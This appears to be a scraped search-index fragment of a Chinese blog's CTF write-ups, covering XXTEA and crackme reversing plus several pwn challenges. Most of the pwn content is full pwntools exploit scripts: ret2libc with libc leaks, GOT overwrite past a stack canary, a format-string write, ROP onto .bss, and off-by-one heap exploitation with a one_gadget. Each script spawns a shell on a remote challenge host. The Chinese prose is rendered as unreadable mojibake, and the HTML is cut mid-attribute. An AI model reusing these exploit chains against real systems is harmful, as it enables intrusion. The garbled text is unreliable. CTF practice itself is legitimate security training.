&lt;p&gt;ÂêåÊó∂ÂèëÁé∞ËøòÈúÄË¶ÅËß£ÂØÜÔºåÈÇ£Â∞±Â§ßÊ¶ÇÁéáÊòØ‰∫ÜÔºåÁõ¥Êé•ËøõÂÖ•ÊéßÂà∂Âè∞Ë∞ÉÁî®ÊñπÊ≥ïÊãøÂà∞flag„ÄÇ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681016263340.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;Re&lt;/h2&gt;
&lt;h3 id=&#34;tutdroid&#34;&gt;tutDroid&lt;/h3&gt;
&lt;p&gt;apkÈôÑ‰ª∂Ôºåjadx-guiÊâìÂºÄÔºåÊù•Âà∞MainActivty&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016753356.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ËæìÂÖ•Ë¢´‰º†ÈÄíÂà∞FlagChecker.checkÊñπÊ≥ïËøõË°åÈ™åËØÅÔºåÂæóÂà∞‰∏Ä‰∏™keyÂíåÂØÜÊñá&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016760521.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;encryptÊñπÊ≥ïÂÆûÈôÖ‰∏äÂ∞±ÊòØÊ†áÂáÜÁöÑXXTEAÂä†ÂØÜ&lt;/p&gt;
&lt;p&gt;encryptToBase64StringÊñπÊ≥ïÔºåÂÖàË∞ÉÁî®encryptÊñπÊ≥ïÔºåÂÜçËøõË°åbase64ÁºñÁ†Å&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016767633.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;È¶ñÂÖàÊääkeyÂíåÂØÜÊñáÂ§ÑÁêÜ‰∏Ä‰∏ãÔºåËΩ¨ÊàêintÊï∞ÁªÑ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import base64
enc=b&amp;quot;vlgg9nNjUcYuWzBSSOwKxbMD2rhFgf4zuiyMpLxpNkM=&amp;quot;
enc=base64.b64decode(enc)
pritnt(enc)
#b&#39;\xbeX \xf6scQ\xc6.[0RH\xec\n\xc5\xb3\x03\xda\xb8E\x81\xfe3\xba,\x8c\xa4\xbci6C&#39;
for i in range(0,len(enc),4):

  tmp=&amp;quot;0x&amp;quot;

  tmp+=hex(enc[i+3])[2:].zfill(2)

  tmp+=hex(enc[i+2])[2:].zfill(2)

  tmp+=hex(enc[i+1])[2:].zfill(2)

tmp+=hex(enc[i+0])[2:].zfill(2)   

print(tmp,end=&amp;quot;,&amp;quot;)
#0xf62058be,0xc6516373,0x52305b2e,0xc50aec48,0xb8da03b3,0x33fe8145,0xa48c2cba,0x433669bc,
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;

#define DELTA 0x9e3779b9
#define MX (((z &amp;gt;&amp;gt; 5 ^ y &amp;lt;&amp;lt; 2) + (y &amp;gt;&amp;gt; 3 ^ z &amp;lt;&amp;lt; 4)) ^ ((sum ^ y) + (key[(p &amp;amp; 3) ^ e] ^ z)))

void btea(uint32_t *v, int n, uint32_t const key[4]){
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    //Âä†ÂØÜ
    if (n &amp;gt; 1){
        rounds = 6 + 52 / n;
        sum = 0;
        z = v[n - 1];
        do{
            sum += DELTA;
            e = (sum &amp;gt;&amp;gt; 2) &amp;amp; 3;
            for (p = 0; p &amp;lt; n - 1; p++){
                y = v[p + 1];
                z = v[p] += MX;
            }
            y = v[0];
            z = v[n - 1] += MX;
        } while (--rounds);
    }
    //Ëß£ÂØÜ
    else if (n &amp;lt; -1){
        n = -n;
        rounds = 6 + 52 / n;
        sum = rounds * DELTA;
        y = v[0];
        do{
            e = (sum &amp;gt;&amp;gt; 2) &amp;amp; 3;
            for (p = n - 1; p &amp;gt; 0; p--){
                z = v[p - 1];
                y = v[p] -= MX;
            }
            z = v[n - 1];
            y = v[0] -= MX;
            sum -= DELTA;
        } while (--rounds);
    }
}
void print_data(uint32_t *v, int n, bool hex_or_chr)
{
    if (hex_or_chr){
        for (int i = 0; i &amp;lt; n; i++){
            printf(&amp;quot;0x%x,&amp;quot;, v[i]);
        }
    }
    else
    {
        for (int i = 0; i &amp;lt; n; i++){
            for (int j = 0; j &amp;lt; sizeof(uint32_t) / sizeof(uint8_t); j++){
                printf(&amp;quot;%c&amp;quot;, (v[i] &amp;gt;&amp;gt; (j * 8)) &amp;amp; 0xFF);
            }
        }
    }
    printf(&amp;quot;\n&amp;quot;);
    return;
}

int main()
{
    // v‰∏∫Ë¶ÅÂä†Ëß£ÂØÜÁöÑÊï∞ÊçÆ
    uint32_t v[] = {0xf62058be, 0xc6516373, 0x52305b2e, 0xc50aec48, 0xb8da03b3, 0x33fe8145, 0xa48c2cba, 0x433669bc};
    // k‰∏∫Âä†Ëß£ÂØÜÂØÜÈí•Ôºå4‰∏™32‰ΩçÊó†Á¨¶Âè∑Êï¥Êï∞ÔºåÂØÜÈí•ÈïøÂ∫¶‰∏∫128‰Ωç
    uint32_t k[4] = {0x57764241, 0x71683757, 0x48764e77, 0x50666855};

    int n = sizeof(v) / sizeof(uint32_t);
    btea(v, -n, k);

    printf(&amp;quot;Ëß£ÂØÜÂêéÊòéÊñáÊï∞ÊçÆÔºö&amp;quot;);
    print_data(v, n, 1);

    printf(&amp;quot;Ëß£ÂØÜÂêéÊòéÊñáÂ≠óÁ¨¶Ôºö&amp;quot;);
    print_data(v, n, 0);

    return 0;
}

// flag{pldCiQuCBtakT4ctlsZQ}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;uglyqt&#34;&gt;uglyqt:&lt;/h3&gt;
&lt;p&gt;idaÊâìÂºÄÔºåÊêúÁ¥¢Â≠óÁ¨¶‰∏≤&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016782971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;‰∫§ÂèâÂºïÁî®ËøáÂéª&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016789390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;Áî®Êà∑Âêç‰∏∫‚Äùzhanghao‚Äù&lt;/p&gt;
&lt;p&gt;ÂØÜÁ†ÅÁªèËøáÂèòÊç¢ÔºåÂèòÊç¢Âêé‰∏é‚ÄùlrgmLVzwcwh5yhy4hgEuxfJ‚ÄùÊØîËæÉ&lt;/p&gt;
&lt;p&gt;ÂØÜÁ†ÅÁöÑÂèòÊç¢ËøáÁ®ãÂú®sub_401580ÂáΩÊï∞&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016797390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string

enc = &amp;quot;lrgmLVzwcwh5yhy4hgEuxfJ&amp;quot;

flag = &amp;quot;&amp;quot;

for c in enc:
    if c.islower():
        for i in string.ascii_lowercase:
            if ord(c) == (ord(i)-91) % 26+97:
                flag += i
    elif c.isupper():
        for i in string.ascii_uppercase:
            if ord(c) == (ord(i)-60) % 26+65:
                flag += i
    else:
        for i in string.digits:
            if ord(c) == (ord(i)-44) % 10+48:
                flag += i

print(flag)
# flagGQtqwqb1sbs0baZorzE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âú®Á®ãÂ∫è‰∏≠Ê≠£Â∏∏ËøêË°å&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016803607.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ÂÜçÊ†πÊçÆflagÊ†ºÂºèË∞ÉÊï¥‰∏ãÔºå‚ÄùGE‚ÄùÊç¢Êàê‚Äù{}‚ÄùÔºå‚Äùb‚ÄùÊç¢Êàê‚Äù_‚Äù&lt;/p&gt;
&lt;p&gt;ÂæóÂà∞flag{Qtqwq_1s_s0_aZorz}&lt;/p&gt;
">TUTCTF2023 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/fav_tKSYV/"" data-c="
          &lt;h3 id=&#34;fibonacci&#34;&gt;fibonacciÔºö&lt;/h3&gt;
&lt;p&gt;Êï∞ÁªÑ‰∏ãÊ†áÊó†Ê£ÄÊü•ÔºåË¥üÊï∞ÂèØ‰ª•ÂèçÂêëÊ∫¢Âá∫Ë¶ÜÁõñgotË°®ÁöÑ__stack_chk_failÊù•ÁªïËøácanaryÔºå‰πãÂêéret2libcÔºåÊúÄÂêéÊâìone_gadgetÊ≥®ÊÑèÊù°‰ª∂&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./[HZNUCTF 2023 final]fibonacci&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28253)
elf=ELF(&amp;quot;./[HZNUCTF 2023 final]fibonacci&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

pop_rdi_ret=0x401a33
vuln=0x4019a2
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
ret=0x40101a
one_gadget=[0xe3afe,0xe3b01,0xe3b04]
pop_r12_r13_r14_r15_ret=0x401a2c


io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;-55&amp;quot;)
io.sendlineafter(b&amp;quot;number\n&amp;quot;,str(ret))

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;0&amp;quot;)
payload=b&amp;quot;\x00&amp;quot;+b&amp;quot;a&amp;quot;*0x57+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendlineafter(b&amp;quot;number\n&amp;quot;,payload)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
shell=leak_addr+one_gadget[0]

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;1&amp;quot;)
payload=b&amp;quot;\x00&amp;quot;+b&amp;quot;a&amp;quot;*0x57+p64(pop_r12_r13_r14_r15_ret)+p64(0)*4+p64(shell)
# gdb.attach(io)
# pause()
io.sendlineafter(b&amp;quot;number\n&amp;quot;,payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a2e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a30 : pop r14 ; pop r15 ; ret
# 0x0000000000401a32 : pop r15 ; ret
# 0x0000000000401a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a2f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040121d : pop rbp ; ret
# 0x00000000004016f6 : pop rbx ; pop rbp ; ret
# 0x0000000000401a33 : pop rdi ; ret
# 0x0000000000401a31 : pop rsi ; pop r15 ; ret
# 0x0000000000401a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x000000000040143f : ret 0x2474
# 0x00000000004017ba : ret 0x458b
# 0x00000000004015c3 : ret 0x850f
# 0x0000000000401580 : ret 0x858b
# 0x00000000004013d1 : ret 0x8d48
# 0x000000000040134d : ret 0xc

# Unique gadgets found: 18

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;eazy_rw&#34;&gt;eazy_rw:&lt;/h3&gt;
&lt;p&gt;syscallÊûÑÈÄ†readÂêëbssÊÆµ‰∏äËØªropÔºàrwÂ∑≤ÁªèÊúâoÔºâ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28167)
# io=process(&amp;quot;./easy_rw&amp;quot;)
elf=ELF(&amp;quot;./easy_rw&amp;quot;)

bss_addr=0x404900
leave_ret=0x40126f
pop_rdi=0x4013c3
pop_rsi_r15=0x4013c1
read_sys=0x401349

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;)
payload=cyclic(0x40)+p64(bss_addr-0x8)+p64(pop_rsi_r15)+p64(bss_addr)+p64(0)+p64(read_sys)
io.send(payload)

#read
rw=p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(bss_addr+0x200)+p64(0)+p64(elf.sym[b&amp;quot;read&amp;quot;])
#puts
rw+=p64(pop_rdi)+p64(bss_addr+0x200)+p64(elf.sym[b&amp;quot;puts&amp;quot;])

payload=rw
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040126f : leave ; ret
# 0x00000000004013bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013be : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013c0 : pop r14 ; pop r15 ; ret
# 0x00000000004013c2 : pop r15 ; ret
# 0x00000000004013bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013bf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004011dd : pop rbp ; ret
# 0x00000000004013c3 : pop rdi ; ret
# 0x00000000004013c1 : pop rsi ; pop r15 ; ret
# 0x00000000004013bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x000000000040124b : ret 0x2be

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">HZNUCTF 2023 final Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/8bTg9SHFI/"" data-c="
          &lt;p&gt;&lt;strong&gt;sign_in&lt;/strong&gt;:&lt;br&gt;
ret2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sign_in&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28649)
elf=ELF(&amp;quot;./sign_in&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)


io.recvuntil(b&amp;quot;here~\n&amp;quot;)
pop_rdi_ret=0x401283
vuln=0x4011db
ret=0x40101a
payload=cyclic(0x48)+p64(pop_rdi_ret)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(vuln)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;here~\n&amp;quot;)
payload=cyclic(0x48)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401280 : pop r14 ; pop r15 ; ret
# 0x0000000000401282 : pop r15 ; ret
# 0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x0000000000401283 : pop rdi ; ret
# 0x0000000000401281 : pop rsi ; pop r15 ; ret
# 0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;check_in&lt;/strong&gt;:&lt;br&gt;
Ë¶ÜÁõñcanary&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./[HZNUCTF 2023 preliminary]checkin_pwn&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28127)
elf=ELF(&amp;quot;./[HZNUCTF 2023 preliminary]checkin_pwn&amp;quot;)

io.recvuntil(b&amp;quot;checkin\n&amp;quot;)
bss_addr=0x4040C0
pop_rdi_ret=0x401483
payload=b&amp;quot;a&amp;quot;*0x28+p64(pop_rdi_ret)+p64(bss_addr)+p64(elf.plt[b&amp;quot;puts&amp;quot;])+b&amp;quot;a&amp;quot;*(0xf00)
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401480 : pop r14 ; pop r15 ; ret
# 0x0000000000401482 : pop r15 ; ret
# 0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040121d : pop rbp ; ret
# 0x0000000000401483 : pop rdi ; ret
# 0x0000000000401481 : pop rsi ; pop r15 ; ret
# 0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;ffmt&lt;/strong&gt;Ôºö&lt;br&gt;
Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤&lt;br&gt;
ËæìÂÖ•ÊúâÈïøÂ∫¶ÈôêÂà∂Ôºå‰∏çËÉΩÁõ¥Êé•fmtstr_payloadÂä´ÊåÅprintf_got&lt;br&gt;
‰ΩçÂÆΩËΩ¨Êç¢‰∏∫Âú∞ÂùÄÂÜôÂÖ•Ê†à‰∏äÔºåÊ≥®ÊÑèbackdoorÊúâÂÅèÁßª&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./ffmt&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28843)
elf=ELF(&amp;quot;./ffmt&amp;quot;)

shell=0x40121b
printf_got=elf.got[b&amp;quot;printf&amp;quot;]

io.sendlineafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;%p&amp;quot;)
addr=int(io.recv(14),16) #Ê≥ÑÈú≤rbp
print(&amp;quot;addr:  &amp;quot;+hex(addr))

io.recvuntil(b&amp;quot;yourself~\n&amp;quot;)
# payload=fmtstr_payload(8,{printf_got:shell})
payload=b&amp;quot;a&amp;quot;*2+b&amp;quot;%.4198945d%8$n&amp;quot;+p64(addr-0x10)  #ÂÜôÂÖ•rbp-0x10Â§Ñ ÂÜôÂÖ•shellÁöÑÂØπÂ∫îÂçÅËøõÂà∂‰ΩçÂÆΩÂèØËΩ¨Âåñ‰∏∫shellÂú∞ÂùÄÔºåÊ≠§È¢òshellÂÜôÂà∞401221
# gdb.attach(io)
# pause()
io.sendline(payload)
 
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;shell&lt;/strong&gt;:&lt;br&gt;
ÈÄÜÂêëÁ®çÂæÆÊúâÁÇπÂ§çÊùÇÔºåÈ¶ñÂÖàËæìÂÖ•&amp;gt;ËøõÂÖ•Â≠êÂáΩÊï∞ÔºåÁ©∫Ê†ºÂàÜÈöîÁ¨¶ÂêéÊª°Ë∂≥&lt;code&gt;&amp;lt;=\x1fÊàñËÄÖ&amp;gt;=z&lt;/code&gt;Âç≥ÂèØËøõÂÖ•Â≠òÂú®Ê†àÊ∫¢Âá∫ÊºèÊ¥ûÁöÑËæìÂÖ•Â§ÑËøõË°året2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./shell&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28569)
elf=ELF(&amp;quot;./shell&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)
pop_rdi_ret=0x401d13
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
vuln=0x401c34
ret=0x40101a

io.recvuntil(b&amp;quot;[haha]$&amp;quot;)
io.sendline(b&amp;quot;&amp;gt; {&amp;quot;)
io.recvuntil(b&amp;quot;name:&amp;quot;)
payload=cyclic(0x68)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;[haha]$&amp;quot;)
io.sendline(b&amp;quot;&amp;gt; {&amp;quot;)
io.recvuntil(b&amp;quot;name:&amp;quot;)
payload=cyclic(0x68)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)
io.sendline(b&amp;quot;cat flag&amp;quot;)
# print(&amp;quot;a:  &amp;quot;+hex(str_bin_sh))
# print(&amp;quot;b:  &amp;quot;+hex(sys_addr))
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401d0c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d0e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d10 : pop r14 ; pop r15 ; ret
# 0x0000000000401d12 : pop r15 ; ret
# 0x0000000000401d0b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d0f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040141d : pop rbp ; ret
# 0x0000000000401a77 : pop rbx ; pop rbp ; ret
# 0x0000000000401d13 : pop rdi ; ret
# 0x0000000000401d11 : pop rsi ; pop r15 ; ret
# 0x0000000000401d0d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x0000000000401855 : ret 0x45c7
# 0x0000000000401593 : ret 0x8d48

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
">HZNUCTF 2023 preliminary Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/sXttqYc_0/"" data-c="
          &lt;p&gt;64‰Ωç‰øùÊä§ÂÖ®ÂºÄÔºåËÄÉÂØüoff by one‰ª•Âèärealloc+offsetÊèêÈ´òÊ†àÂú∞ÂùÄÊâìone_gadget&lt;br&gt;
one_gadgetÊâìÈÄöÊòØÈúÄË¶Å‰∏ÄÂÆöÊù°‰ª∂ÁöÑÔºåÂ¶ÇÊûúÊ≤°ÊâìÈÄöÂ∞±ÊòØÊù°‰ª∂Ê≤°Êª°Ë∂≥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰æãÂ¶ÇËøô‰∏™one_gadgetÈúÄË¶ÅÊª°Ë∂≥&lt;code&gt;[$rsp+0x30]==NULL&lt;/code&gt;Ôºå&lt;br&gt;
Ê≠§È¢òÊ†áÂáÜËèúÂçïÂ¢ûÂà†ÊîπÊòæÔºådeleteÊ≤°ÊúâuafÔºåaddÊ≤°ÊúâÂ†ÜÊ∫¢Âá∫ÔºåeditÊúâÊ£ÄÊü•Ôºå‰ΩÜÊòØeditÂ≠òÂú®off by oneÂèØ‰ª•Ê∫¢Âá∫‰∏Ä‰∏™Â≠óËäÇÁöÑsizeÔºå‰øÆÊîπÂêéÂèØ‰ª•Âà©Áî®unsortedbin Ê≥ÑÈú≤Âú∞ÂùÄÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;add(0x18,b&amp;quot;qqq&amp;quot;) #0
add(0x40,b&amp;quot;www&amp;quot;) #1
add(0x60,b&amp;quot;eee&amp;quot;) #2
add(0x10,b&amp;quot;sss&amp;quot;) #3


payload=cyclic(0x18)+p64(0xc1)
edit(0,payload)


delete(1)
add(0x40,b&amp;quot;wqw&amp;quot;)
show(2)
leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê≠§È¢òÁõ¥Êé•‰ΩøÁî®malloc_hookÊâìone_gadgetÊâì‰∏çÈÄöÔºåÂ¶ÇÂõæÔºå&lt;code&gt;[$rsp+0x30]&lt;/code&gt;ÁöÑÂÄº‰∏ç‰∏∫0&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680702994337.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊâÄ‰ª•&lt;code&gt;malloc-&amp;gt;__malloc_hook-&amp;gt;realloc+offset-&amp;gt;__realloc_hook-&amp;gt;one_gadget&lt;/code&gt;&lt;br&gt;
ÈÄöËøá‰øÆÊîπreallocÁöÑÂÅèÁßªÊõ¥ÊîπÊ†àÂú∞ÂùÄ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680704260750.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊØèÂ∞ë‰∏Ä‰∏™pushÔºåÊ†àÂú∞ÂùÄÊèêÈ´ò8&lt;br&gt;
